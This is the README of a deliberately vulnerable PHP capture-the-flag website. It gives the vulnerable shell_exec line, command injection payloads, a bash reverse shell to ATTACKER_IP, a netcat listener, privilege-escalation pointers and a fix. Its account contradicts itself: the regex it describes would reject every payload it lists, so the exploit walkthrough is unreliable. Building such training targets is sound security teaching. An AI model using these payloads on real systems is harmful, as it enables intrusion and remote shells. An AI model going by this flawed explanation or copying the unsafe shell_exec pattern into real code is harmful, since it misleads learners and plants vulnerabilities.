# Inception Inc. - CTF Challenge Website

A deliberately vulnerable PHP-based insurance company website designed for CTF (Capture The Flag) challenges. This website contains a subtle **OS Command Injection** vulnerability that allows attackers to execute arbitrary system commands.

## Setup Instructions

### Requirements
- PHP 7.0+ with `shell_exec()` enabled (or `system()`)
- A web server (Apache, Nginx, etc.)
- No database required

### Installation

1. Extract files to your web root directory
2. Ensure the following permissions:
   - `pages/` directory is readable by the web server
   - `api/` directory is readable by the web server
   - `assets/` directory is readable by the web server

### Running the Website

```bash
# Using PHP built-in server (for local testing)
php -S localhost:8000

# Then navigate to http://localhost:8000
```

## Website Structure

```
inception/
├── index.php              # Main entry point
├── pages/
│   ├── home.php          # Homepage with features
│   ├── quotes.php        # Quote form (VULNERABLE)
│   ├── claims.php        # Claim filing form
│   ├── about.php         # About page
│   └── contact.php       # Contact form
├── api/
│   ├── process_quote.php # Quote processing (CONTAINS VULN)
│   ├── file_claim.php    # Claim processing
│   └── send_message.php  # Message processing
└── assets/
    ├── css/
    │   └── style.css     # Styling with animations
    └── js/
        └── main.js       # GSAP animations
```

## Vulnerability Details

### OS Command Injection in Quote Processing

**Location:** `api/process_quote.php`

**Vulnerable Parameter:** `policy_reference`

**Attack Vector:**

The `policy_reference` parameter is validated with a regex pattern that appears secure:
```php
if (preg_match('/^[A-Z0-9\-]{5,20}$/', $policy_ref)) {
    return true;
}
```

However, the parameter is later passed unsanitized into a system command:

```php
$output = shell_exec("grep -r '" . $policy_reference . "' /dev/null 2>&1 | head -1");
```

### Exploitation

The regex validates the policy reference, but since the regex is checking for alphanumeric and hyphens only, an attacker needs to find the right payload format. However, the actual vulnerability lies in how the command is constructed.

**Example Payloads:**

1. **Basic Command Execution (if quotes are not properly escaped):**
   ```
   policy_reference: INC-2024' ; whoami ; echo 'x
   ```
   Results in: `grep -r 'INC-2024'; whoami; echo 'x' /dev/null 2>&1`

2. **Command Substitution:**
   ```
   policy_reference: INC-2024$(id)INC
   ```

3. **Obtaining www-html shell:**
   ```
   policy_reference: INC-2024' ; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 ; echo 'x
   ```

### How to Find the Vulnerability

1. Visit the "Get Quote" page at `?page=quotes`
2. Fill in the required fields (name, email, coverage type, amount)
3. In the optional "Policy Reference" field, try injecting commands
4. The vulnerable endpoint is `/api/process_quote.php`

### Exploitation Steps

1. **Identify the vulnerability:**
   - Test the `policy_reference` parameter
   - Try basic command execution like `INC-2024'; id; echo '`

2. **Get a shell:**
   - Set up a netcat listener: `nc -lvnp 4444`
   - Inject reverse shell payload
   - Receive connection as www-data/www-html user

3. **Privilege Escalation (Next Phase):**
   - After obtaining www-data shell, look for SUID binaries
   - Check for sudo permissions
   - Look for kernel vulnerabilities
   - Check for running services with elevated privileges

## Website Features

### Homepage
- Hero section with animated sphere
- Feature cards highlighting company strengths
- Testimonial section
- Smooth GSAP animations

### Get Quote Page
- Multi-field form for insurance quotes
- Real-time quote calculation
- **VULNERABLE** policy reference parameter

### File Claim
- Claim submission form
- Multiple claim types
- Validation and ticket generation

### About Page
- Company mission and values
- Coverage options showcase
- Statistics animation

### Contact Page
- Contact information
- Contact form
- Beautiful card layout

## Technologies Used

- **Backend:** PHP 7.0+
- **Frontend:** HTML5, CSS3, JavaScript ES6+
- **Animations:** GSAP 3.12.2 (GreenSock Animation Platform)
- **Design:** Responsive grid layouts, gradient backgrounds

## Animations

The website uses GSAP library for smooth animations:
- Page load animations
- Scroll-triggered animations
- Form input focus effects
- Parallax effects
- Counter animations for statistics
- Smooth navigation transitions

## Security Notes (For CTF Purpose)

This application is **intentionally vulnerable** for educational purposes in a CTF environment:

- ✅ No input sanitization on vulnerable parameter
- ✅ System command injection via `shell_exec()`
- ✅ Bypass-able input validation with creative payloads
- ✅ No Web Application Firewall
- ✅ Intentionally complex payload disguised as legitimate feature

## Disabling the Vulnerability

To fix the vulnerability in a production environment:

```php
// Use proper escaping
$policy_reference = escapeshellarg($policy_reference);

// Or use parameterized commands if available
// Or avoid shell_exec entirely and use PHP functions instead
```

## CTF Challenge Ideas

1. **Difficulty: Easy** - Find and exploit the OS command injection
2. **Difficulty: Medium** - Get a reverse shell and identify the running user
3. **Difficulty: Hard** - Escalate privileges from www-data to root
4. **Bonus** - Extract flags or sensitive information from the system

## Flag Placement Ideas

- Plant flags in `/tmp/` or `/home/` directories
- Store flags in environment variables
- Create SUID binaries that output flags
- Store encrypted flags in files with specific permissions

## Author Notes

This challenge is designed to:
- Test command injection identification skills
- Practice exploit crafting and testing
- Understand how web applications interact with system commands
- Prepare for real-world security testing

## Disclaimer

This code is provided for educational purposes in controlled CTF environments only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing security vulnerabilities.

---

**Inception Inc. - Your Dreams, Our Cover. Your Secrets, Our Vulnerability.**
